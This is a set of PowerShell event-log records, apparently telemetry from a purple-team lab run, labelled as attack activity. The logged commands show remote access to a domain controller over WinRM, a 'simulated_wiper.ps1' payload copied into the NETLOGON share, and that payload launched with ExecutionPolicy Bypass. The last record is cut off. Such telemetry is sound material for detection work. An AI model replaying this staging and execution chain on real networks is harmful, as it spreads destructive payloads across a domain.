{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:53Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":154},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Invoke-Command): \"Invoke-Command\"\\nParameterBinding(Invoke-Command): name=\"Session\"; value=\"[PSSession]WinRM4\"\\nParameterBinding(Invoke-Command): name=\"ArgumentList\"; value=\"C:\\CyberRangers\\payload\\simulated_wiper.ps1\"\\nParameterBinding(Invoke-Command): name=\"ScriptBlock\"; value=\"\\n            param($Path)\\n\\n            if (-not (Test-Path $Path -PathType Leaf)) {\\n                throw \"Remote payload missing: $Path\"\\n            }\\n\\n            (Get-FileHash $Path -Algorithm SHA256).Hash\\n        \"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Invoke-Command\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2717\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17174}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":155},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Copy-Item): \"Copy-Item\"\\nParameterBinding(Copy-Item): name=\"Path\"; value=\"C:\\CyberRangers\\payload\\simulated_wiper.ps1\"\\nParameterBinding(Copy-Item): name=\"Destination\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\nParameterBinding(Copy-Item): name=\"Force\"; value=\"True\"\\nParameterBinding(Copy-Item): name=\"FromSession\"; value=\"[PSSession]WinRM4\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Copy-Item\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2719\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17209}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":156},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Test-Path): \"Test-Path\"\\nParameterBinding(Test-Path): name=\"PathType\"; value=\"Leaf\"\\nParameterBinding(Test-Path): name=\"Path\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Test-Path\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2721\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17210}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":157},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Resolve-Path): \"Resolve-Path\"\\nParameterBinding(Resolve-Path): name=\"Path\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\nCommandInvocation(ForEach-Object): \"ForEach-Object\"\\nParameterBinding(ForEach-Object): name=\"MemberName\"; value=\"ProviderPath\"\\nParameterBinding(ForEach-Object): name=\"InputObject\"; value=\"Microsoft.PowerShell.Core\\FileSystem::\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Resolve-Path\\n        Command Type = Cmdlet\\n        Script Name = C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1\\n        Command Path = \\n        Sequence Number = 2723\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17211}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":158},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Test-Path): \"Test-Path\"\\nParameterBinding(Test-Path): name=\"LiteralPath\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\nParameterBinding(Test-Path): name=\"PathType\"; value=\"Container\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Test-Path\\n        Command Type = Cmdlet\\n        Script Name = C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1\\n        Command Path = \\n        Sequence Number = 2725\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17212}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":159},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(GetStreamHash): \"GetStreamHash\"\\nParameterBinding(GetStreamHash): name=\"InputStream\"; value=\"System.IO.FileStream\"\\nParameterBinding(GetStreamHash): name=\"RelatedPath\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\nParameterBinding(GetStreamHash): name=\"Hasher\"; value=\"System.Security.Cryptography.SHA256CryptoServiceProvider\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = GetStreamHash\\n        Command Type = Function\\n        Script Name = C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1\\n        Command Path = \\n        Sequence Number = 2727\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17213}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":160},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-FileHash): \"Get-FileHash\"\\nParameterBinding(Get-FileHash): name=\"Algorithm\"; value=\"SHA256\"\\nParameterBinding(Get-FileHash): name=\"Path\"; value=\"\\\\purplelab.local\\NETLOGON\\simulated_wiper.ps1\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-FileHash\\n        Command Type = Function\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2729\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17214}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":161},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Remove-PSSession): \"Remove-PSSession\"\\nParameterBinding(Remove-PSSession): name=\"Session\"; value=\"[PSSession]WinRM4\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Remove-PSSession\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2731\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17217}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":162},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2733\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17218}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":163},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(ConvertTo-Json): \"ConvertTo-Json\"\\nParameterBinding(ConvertTo-Json): name=\"Depth\"; value=\"6\"\\nCommandInvocation(Set-Content): \"Set-Content\"\\nParameterBinding(Set-Content): name=\"LiteralPath\"; value=\"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\domain-controller\\03-dc-netlogon-proof.json\"\\nParameterBinding(Set-Content): name=\"Encoding\"; value=\"UTF8\"\\nParameterBinding(ConvertTo-Json): name=\"InputObject\"; value=\"System.Collections.Specialized.OrderedDictionary\"\\nParameterBinding(Set-Content): name=\"Value\"; value=\"{\\n    \"run_id\":  \"run-001\",\\n    \"started_utc\":  \"2026-08-11T15:14:48.3872770Z\",\\n    \"initiating_host\":  \"PURPLELAB-WIN-C\",\\n    \"initiating_user\":  \"PURPLELAB\\\\jdoe\",\\n    \"target_fqdn\":  \"WIN-5PBHN06IDFU.purplelab.local\",\\n    \"winrm_reachable\":  true,\\n    \"remote_access\":  {\\n                          \"collected_utc\":  \"2026-08-11T15:14:53.4181785Z\",\\n                          \"remote_hostname\":  \"WIN-5PBHN06IDFU\",\\n                          \"remote_user\":  \"purplelab\\\\administrator\",\\n                          \"domain\":  \"purplelab.local\",\\n                          \"domain_role\":  5,\\n                          \"is_domain_dc\":  true,\\n                          \"PSComputerName\":  \"WIN-5PBHN06IDFU.purplelab.local\",\\n                          \"RunspaceId\":  \"c9f9cc9d-378b-4ce1-8d1f-4766ef22fb5d\",\\n                          \"PSShowComputerName\":  true\\n                      },\\n    \"remote_payload_path\":  \"C:\\\\CyberRangers\\\\payload\\\\simulated_wiper.ps1\",\\n    \"remote_payload_sha256\":  {\\n                                  \"value\":  \"4D6640D8DB08E64F624FA624FD8BEA67EFA340224244F48D74E208F3B6814F89\",\\n                                  \"PSComputerName\":  \"WIN-5PBHN06IDFU.purplelab.local\",\\n                                  \"RunspaceId\":  \"c9f9cc9d-378b-4ce1-8d1f-4766ef22fb5d\",\\n                                  \"PSShowComputerName\":  true\\n                              },\\n    \"netlogon_destination\":  \"\\\\\\\\purplelab.local\\\\NETLOGON\\\\simulated_wiper.ps1\",\\n    \"netlogon_payload_sha256\":  \"4D6640D8DB08E64F624FA624FD8BEA67EFA340224244F48D74E208F3B6814F89\",\\n    \"copy_verified\":  true,\\n    \"error\":  null,\\n    \"completed_utc\":  \"2026-08-11T15:14:54.0433901Z\"\\n}, ...\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = ConvertTo-Json\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\test_dc_access.ps1\\n        Command Path = \\n        Sequence Number = 2735\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17219}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":164},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2737\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17220}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":165},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Export-Csv): \"Export-Csv\"\\nParameterBinding(Export-Csv): name=\"Path\"; value=\"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\run_it_vector.csv\"\\nParameterBinding(Export-Csv): name=\"NoTypeInformation\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"Append\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"InputObject\"; value=\"@{timestamp_utc=2026-08-11T15:14:54.0533024Z; run_id=run-001; phase=dc_netlogon; status=COMPLETED; details=Step completed successfully.}\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Export-Csv\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2739\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17221}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":166},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Test-Path): \"Test-Path\"\\nParameterBinding(Test-Path): name=\"PathType\"; value=\"Leaf\"\\nParameterBinding(Test-Path): name=\"Path\"; value=\"\\\\purplelab.local\\netlogon\\simulated_wiper.ps1\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Test-Path\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2741\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17222}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":167},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Get-Date): \"Get-Date\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Get-Date\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2743\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17223}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":168},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Export-Csv): \"Export-Csv\"\\nParameterBinding(Export-Csv): name=\"Path\"; value=\"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\run_it_vector.csv\"\\nParameterBinding(Export-Csv): name=\"NoTypeInformation\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"Append\"; value=\"True\"\\nParameterBinding(Export-Csv): name=\"InputObject\"; value=\"@{timestamp_utc=2026-08-11T15:14:54.0652778Z; run_id=run-001; phase=wiper; status=STARTED; details=Step started.}\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Export-Csv\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2745\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17224}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":169},"data":{"event_id":4104,"event_type":"script_block","script_text":"Creating Scriptblock text (1 of 1):\\n{\\n        # This launches a distinct powershell.exe process.\\n        # Sysmon should record its parent, command line, user, and image.\\n        Write-Output \"Hello!\"\\n        & powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"& '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\"\\n\\n        if ($LASTEXITCODE -ne 0) {\\n            throw \"Wiper process exited with code $LASTEXITCODE.\"\\n        }\\n    }\\n\\nScriptBlock ID: 5dde8b51-2964-48e1-bbf6-6e4fea3a03d3\\nPath: Z:\\windows\\run_it_vector.ps1","record_id":17225}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:54Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":170},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Write-Output): \"Write-Output\"\\nParameterBinding(Write-Output): name=\"InputObject\"; value=\"Hello!\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = a02d10d4-ac40-4a73-bdd1-bb8bb54ffa68\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = 4c42a43a-9e18-42e7-82d5-39afd17cf314\\n        Pipeline ID = 43\\n        Command Name = Write-Output\\n        Command Type = Cmdlet\\n        Script Name = Z:\\windows\\run_it_vector.ps1\\n        Command Path = \\n        Sequence Number = 2747\\n        User = PURPLELAB\\jdoe\\n        Connected User = \\n        Shell ID = Microsoft.PowerShell\\n\\n\\nUser Data:\\n\\n","record_id":17226}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:55Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":171},"data":{"event_id":4104,"event_type":"script_block","script_text":"Creating Scriptblock text (1 of 1):\\n& '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n\\nScriptBlock ID: da658d12-87f4-443e-845d-20f7a7a18edc\\nPath: ","record_id":17230}}
{"schema_version":"1.0","record_type":"powershell","timestamp_utc":"2026-08-11T15:14:58Z","host":"purplelab-win-client.purplelab.local","user":"S-1-5-21-1898955512-2253536272-2216333128-1103","provider":"Microsoft-Windows-PowerShell","run_id":"run-001","label":"attack","source":{"raw_file":"C:\\CyberRangers\\evidence\\it\\runs\\run-001\\raw\\windows-client\\EventLog_Microsoft-Windows-PowerShell_Operational.csv","raw_row":172},"data":{"event_id":4103,"event_type":"module_pipeline","script_text":"CommandInvocation(Resolve-Path): \"Resolve-Path\"\\nParameterBinding(Resolve-Path): name=\"LiteralPath\"; value=\"C:\\WiperTest\"\\n\\n\\nContext:\\n        Severity = Informational\\n        Host Name = ConsoleHost\\n        Host Version = 5.1.26100.8875\\n        Host ID = 1ce98769-62ca-497d-b4d9-b6923fc47b5b\\n        Host Application = C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command & '\\\\purplelab.local\\netlogon\\simulated_wiper.ps1' -TargetDirectory 'C:\\WiperTest'\\n        Engine Version = 5.1.26100.8875\\n        Runspace ID = d8a27e9c-fe1a-40ac-9e5f-4338465dc6be\\n        